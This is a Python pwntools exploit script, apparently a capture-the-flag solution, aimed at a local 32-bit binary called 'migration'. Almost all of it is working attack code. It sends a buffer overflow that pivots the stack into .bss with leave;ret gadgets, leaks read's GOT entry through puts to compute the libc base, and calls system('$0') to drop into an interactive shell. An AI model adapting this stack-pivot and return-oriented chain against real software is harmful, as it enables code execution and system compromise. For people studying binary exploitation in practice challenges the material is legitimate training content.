#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
from time import sleep
context.log_level = "debug"
context.terminal = ["deepin-terminal", "-x", "sh", "-c"] 
def DEBUG():
    raw_input("DEBUG: ")
    gdb.attach(io)

elf = ELF("./migration")
libc = elf.libc

#  bufAddr = elf.bss()
bufAddr = 0x0804a000
readPlt = elf.plt["read"]
readGot = elf.got["read"]
putsPlt = elf.plt["puts"]
p1ret = 0x0804836d
p3ret = 0x08048569
leaveRet = 0x08048504


io = process("./migration")
#  DEBUG()
payload = flat([cyclic(0x28), bufAddr + 0x100, readPlt, leaveRet, 0, bufAddr + 0x100, 0x100])
io.sendafter(" :\n", payload)
sleep(0.1)

payload = flat([bufAddr + 0x600, putsPlt, p1ret, readGot, readPlt, leaveRet, 0, bufAddr + 0x600, 0x100])
io.send(payload)
sleep(0.1)
#  print io.recv()
libcBase = u32(io.recv()[: 4]) - libc.sym['read']
success("libcBase -> {:#x}".format(libcBase))
pause()

payload = flat([bufAddr + 0x100, readPlt, p3ret, 0, bufAddr + 0x100, 0x100, libcBase + libc.sym['system'], 0xdeadbeef, bufAddr + 0x100])
io.send(payload)
sleep(0.1)
io.send("$0\0")
sleep(0.1)

io.interactive()
io.close()
